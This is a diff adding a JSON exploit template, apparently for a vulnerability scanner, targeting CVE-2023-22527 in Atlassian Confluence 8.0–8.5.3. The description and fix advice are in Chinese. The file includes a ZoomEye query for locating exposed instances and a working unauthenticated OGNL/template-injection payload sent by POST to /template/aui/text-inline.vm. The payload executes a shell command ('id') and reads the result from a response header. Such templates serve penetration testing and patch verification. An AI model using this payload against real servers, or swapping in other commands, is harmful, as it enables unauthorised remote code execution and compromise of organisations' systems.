@@ -1,0 +1,40 @@
+{
+  "product": "Atlassian Confluence",
+  "vul_name": "Atlassian Confluence 远程代码执行漏洞",
+  "type": "代码执行",
+  "vul_id": [
+    "CVE-2023-22527"
+  ],
+  "level": 3,
+  "vul_desc": "Atlassian Confluence是澳大利亚Atlassian公司的一套专业的企业知识管理与协同软件，也可以用于构建企业WiKi。Atlassian Confluence Data Center and Server存在安全漏洞，该漏洞源于存在模板注入漏洞，允许未经身份验证的攻击者在受影响的实例上实现远程代码执行。",
+  "version": "Atlassian Confluence 8.0 - 8.5.3",
+  "note": "",
+  "search": {
+    "ZoomEye": "app:\"Atlassian Confluence\""
+  },
+  "protocol": "http",
+  "link": "",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/template/aui/text-inline.vm",
+      "data": "label=aaa\\u0027%2b#request.get(\\u0027.KEY_velocity.struts2.context\\u0027).internalGet(\\u0027ognl\\u0027).findValue(#parameters.poc[0],{})%2b\\u0027&poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader('Cmd',(new+freemarker.template.utility.Execute()).exec({'id'}))"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "header": {
+            "Cmd": "uid="
+          }
+        }
+      ]
+    }
+  }
+}
